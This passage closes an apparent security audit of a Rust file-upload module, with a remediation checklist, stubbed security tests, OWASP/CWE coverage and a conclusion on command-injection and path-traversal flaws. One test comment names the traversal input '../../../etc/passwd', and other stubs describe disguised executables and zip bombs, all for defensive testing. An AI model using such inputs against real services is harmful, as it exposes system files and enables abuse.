- [ ] Add rate limiting for file uploads
- [ ] Implement storage quotas per user
- [ ] Add decompression bomb detection for Office files
- [ ] Fix temporary file race conditions (use create_new flag)
- [ ] Set explicit file permissions (0600)

### 3. MEDIUM PRIORITY (This Quarter)

- [ ] Implement download token revocation mechanism
- [ ] Add timeout for PDF rendering operations
- [ ] Improve temporary file cleanup (RAII pattern)
- [ ] Add metadata validation
- [ ] Consider obfuscating storage directory structure

### 4. LOW PRIORITY (Future)

- [ ] Implement granular file size limits by type
- [ ] Add logging for suspicious activity (failed access attempts, large uploads)
- [ ] Consider implementing virus scanning integration
- [ ] Add checksum deduplication to save storage space

---

## Testing Recommendations

### Security Test Cases to Implement

```rust
#[tokio::test]
async fn test_path_traversal_in_extension() {
    // Test: Upload file with extension "../../../etc/passwd"
    // Expected: Rejected with INVALID_EXTENSION error
}

#[tokio::test]
async fn test_executable_file_rejection() {
    // Test: Upload file with .exe extension
    // Expected: Rejected with BLOCKED_FILE_TYPE error
}

#[tokio::test]
async fn test_mime_type_mismatch() {
    // Test: Upload EXE file with .jpg extension
    // Expected: Rejected with FILE_TYPE_MISMATCH error
}

#[tokio::test]
async fn test_upload_rate_limiting() {
    // Test: Upload 51 files in one hour
    // Expected: 51st upload rejected with RATE_LIMIT_EXCEEDED
}

#[tokio::test]
async fn test_storage_quota() {
    // Test: Upload files exceeding user quota
    // Expected: Rejected with STORAGE_QUOTA_EXCEEDED
}

#[tokio::test]
async fn test_zip_bomb_detection() {
    // Test: Upload malicious DOCX with high compression ratio
    // Expected: Rejected with DECOMPRESSION_BOMB error
}

#[tokio::test]
async fn test_download_token_expiry() {
    // Test: Use expired download token
    // Expected: 401 Unauthorized
}

#[tokio::test]
async fn test_file_access_control() {
    // Test: User A tries to download User B's file
    // Expected: 403 Forbidden
}
```

---

## Compliance Notes

### OWASP Top 10 Coverage

- **A01:2021 - Broken Access Control**: ✓ Well implemented
- **A03:2021 - Injection**: ⚠️ Command injection via Pandoc (CRITICAL)
- **A04:2021 - Insecure Design**: ⚠️ Missing rate limiting, quotas
- **A05:2021 - Security Misconfiguration**: ⚠️ File permissions, temp files
- **A08:2021 - Software and Data Integrity Failures**: ⚠️ No file type validation

### CWE Coverage

- **CWE-22**: Path Traversal - FOUND (extension validation)
- **CWE-78**: OS Command Injection - FOUND (Pandoc/LaTeX)
- **CWE-434**: Unrestricted Upload of Dangerous File Type - FOUND
- **CWE-400**: Uncontrolled Resource Consumption - FOUND (rate limiting, quotas)
- **CWE-73**: External Control of File Name - FOUND
- **CWE-426**: Untrusted Search Path - NOT FOUND ✓
- **CWE-89**: SQL Injection - NOT FOUND ✓

---

## Conclusion

The file module has a **solid foundation** with good access control and parameterized queries, but contains **two critical vulnerabilities** that must be addressed immediately:

1. Command injection via Pandoc/LaTeX
2. Path traversal via unvalidated extensions

Once these are fixed and the high-priority items are addressed, the module will have a strong security posture suitable for production deployment.

**Estimated Remediation Effort:**
- Critical fixes: 2-3 days
- High priority fixes: 1 week
- Medium priority fixes: 2 weeks
- Total: ~4 weeks for comprehensive security hardening

---

**Report End**
